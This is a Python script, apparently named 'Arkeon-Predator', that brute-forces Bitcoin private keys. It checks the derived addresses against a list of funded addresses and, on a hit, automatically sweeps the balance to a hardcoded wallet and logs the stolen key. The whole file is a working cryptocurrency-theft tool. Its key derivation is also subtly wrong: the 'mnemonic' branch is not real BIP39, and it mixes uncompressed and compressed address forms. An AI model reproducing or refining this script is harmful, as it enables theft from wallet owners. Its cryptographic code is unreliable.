import os
import secrets
import threading
import time
import sys
import hashlib
import base58
import requests
from bit import Key
from pybloom_live import BloomFilter
from ecdsa import SigningKey, SECP256k1

# --- SETTINGS ---
# Replace with your own wallet address
SAFE_ADDRESS = "bc1qcsxmq6euv4vu35wtft3n2rz24tm3jn4kfmqwr7"
FILENAME = "temiz_adresler"
WORDLIST = "bip39.txt"

# BloomFilter: 60M address capacity (Uses ~150MB RAM)
ADDRESS_FILTER = BloomFilter(capacity=60000000, error_rate=0.00001)
shared_lock = threading.Lock()
shared_data = {'total': 0}

# Load Wordlist
WORDS = open(WORDLIST, "r").read().splitlines() if os.path.exists(WORDLIST) else ["abandon"]

def load_bloom():
    print(f"[*] Loading {FILENAME} into memory...")
    count = 0
    with open(FILENAME, "r", encoding="utf-8") as f:
        for line in f:
            addr = line.strip()
            if addr:
                ADDRESS_FILTER.add(addr)
                count += 1
    print(f"[*] {count} addresses loaded for scanning.")

def priv_to_address(priv_bytes):
    """Fast address derivation using ecdsa"""
    sk = SigningKey.from_string(priv_bytes, curve=SECP256k1)
    vk = sk.verifying_key
    pub_key = b'\x04' + vk.to_string()
    h = hashlib.sha256(pub_key).digest()
    r = hashlib.new('ripemd160', h).digest()
    return base58.b58encode_check(b'\x00' + r).decode()

def predator_worker():
    while True:
        try:
            # 1. Hybrid Key Generation (Random + BIP39)
            if secrets.randbelow(2) == 0:
                priv = secrets.token_bytes(32)
            else:
                mnemonic = " ".join([secrets.choice(WORDS) for _ in range(12)])
                priv = hashlib.sha256(mnemonic.encode()).digest()[:32]

            addr = priv_to_address(priv)
            
            # 2. BloomFilter Check
            if addr in ADDRESS_FILTER:
                k = Key.from_hex(priv.hex())
                bal = int(k.get_balance('satoshi'))
                
                if bal > 3000:
                    with shared_lock:
                        print(f"\n\n[!!!] BINGO FOUND! {addr} | Balance: {bal} sat")
                        print(f"[!] Sending funds to SAFE_ADDRESS...")
                    
                    tx = k.send_all(SAFE_ADDRESS, fee=3000)
                    with open("arkeon_bingo.log", "a") as log:
                        log.write(f"Key: {priv.hex()} | Addr: {addr} | Bal: {bal} | TX: {tx} | Time: {time.ctime()}\n")
            
            with shared_lock:
                shared_data['total'] += 1
            
        except Exception:
            continue

if __name__ == "__main__":
    load_bloom()
    # 4 Threads for high-speed scanning
    for _ in range(4):
        t = threading.Thread(target=predator_worker)
        t.daemon = True
        t.start()
    
    start_time = time.time()
    print("[*] ARKEON v49.0 (Arkeon-Predator) IS NOW ACTIVE!")
    try:
        while True:
            time.sleep(5)
            with shared_lock:
                total = shared_data['total']
            elapsed = time.time() - start_time
            hiz = total / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r[*] Ghost Hunter: {total} | Speed: {hiz:.2f} a/s | Status: Stabil")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[!] Operation stopped by user.")
